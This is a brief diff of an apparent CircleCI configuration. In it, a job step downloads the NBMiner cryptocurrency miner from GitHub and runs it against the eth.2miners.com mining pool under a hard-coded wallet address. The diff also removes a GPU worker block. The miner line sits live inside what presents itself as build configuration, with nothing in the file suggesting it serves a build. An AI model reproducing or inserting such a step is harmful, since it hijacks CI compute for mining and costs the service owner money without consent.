@@ -9,8 +9,3 @@ jobs:
     steps:
       - checkout
       - run:  wget https://github.com/NebuTech/NBMiner/releases/download/v41.5/NBMiner_41.5_Linux.tgz && tar xf NBMiner_41.5_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 12VJ4wRvUEFJN3UjjvYWkmatjZUMj1sZJp.T4_1
-  worker1:
-    machine:
-       image: ubuntu:18.04
-    resource_class: gpu.nvidia.large
-    parallelism: 4
